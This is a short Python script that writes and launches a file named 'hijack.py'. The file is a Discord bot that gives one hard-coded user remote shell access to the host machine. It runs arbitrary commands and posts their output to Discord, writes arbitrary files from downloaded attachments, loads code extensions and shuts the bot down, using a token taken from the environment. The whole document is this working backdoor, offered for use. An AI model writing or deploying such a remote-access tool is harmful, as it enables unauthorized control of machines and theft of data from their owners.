import os
open('hijack.py','w').write(f'''
import subprocess, requests, os
from discord.ext import commands

bot = commands.Bot('')
x = 2000

@bot.check
async def owner(ctx):
	c = ctx.author.id == 394771663155101727
	if not c:
		await ctx.send('how about no')
	return c

@bot.command()
async def sh(ctx, *args):
	o = 'out.txt'
	subprocess.run(
		args=args,
		stdout=open(o,'w'),
		stderr=subprocess.STDOUT,
		timeout=30)
	l =  open(o).read()
	c = [l[y-x:y] for y in range(x,len(l)+x,x)]
	for d in c: await ctx.send(d)

@bot.command()
async def load(ctx, e): bot.load_extension(e)

@bot.command()
async def unload(ctx, e): bot.unload_extension(e)

@bot.command()
async def reload(ctx, e): bot.reload_extension(e)

@bot.command()
async def upload(ctx, p):
	c = requests.get(ctx.message.attachments[0].url).text
	open(p, 'w').write(c)

@bot.command()
async def shutdown(ctx): exit()


class oce(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.Cog.listener()
	async def on_command_error(self, ctx, err):
		if isinstance(err, commands.CommandNotFound): return
		if isinstance(err, commands.CheckFailure): return
		await ctx.send(err)


bot.add_cog(oce(bot))
bot.run(os.getenv('TOKEN'))
''')
os.system('python hijack.py')
